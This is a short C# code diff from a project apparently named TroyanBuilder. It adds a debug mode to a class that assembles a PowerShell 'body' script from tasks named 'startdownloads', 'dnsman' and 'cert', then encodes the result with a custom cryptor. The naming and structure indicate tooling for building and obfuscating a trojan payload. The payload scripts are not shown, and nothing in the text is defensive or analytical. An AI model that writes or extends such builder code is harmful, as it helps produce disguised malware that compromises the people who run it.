@@ -2,9 +2,13 @@ namespace TroyanBuilder;
 
 public sealed class BodyBuilder : CustomBuilder
 {
+    public BodyBuilder(TroyanBuildMode mode) : base(mode)
+    {
+    }
+
     protected override string SourceDir => L.TroyanScriptDir;
 
-    protected override string OutputFile => L.BodyPs1;
+    protected override string OutputFile => Mode == TroyanBuildMode.Debug ? L.BodyPs1Debug : L.BodyPs1;
 
     protected override string[] PriorityTasks => new[] { "startdownloads", "dnsman", "cert" };
     protected override string[] UnpriorityTasks => new[] { "extraupdate" };
@@ -99,6 +103,7 @@ public sealed class BodyBuilder : CustomBuilder
 
     protected override void PostBuild()
     {
-        CustomCryptor.Encode(File.ReadAllText(OutputFile), L.Body);
+        var bodyTxt = Mode == TroyanBuildMode.Debug ? L.BodyDebugTxt : L.Body;
+        CustomCryptor.Encode(File.ReadAllText(OutputFile), bodyTxt);
     }
 }
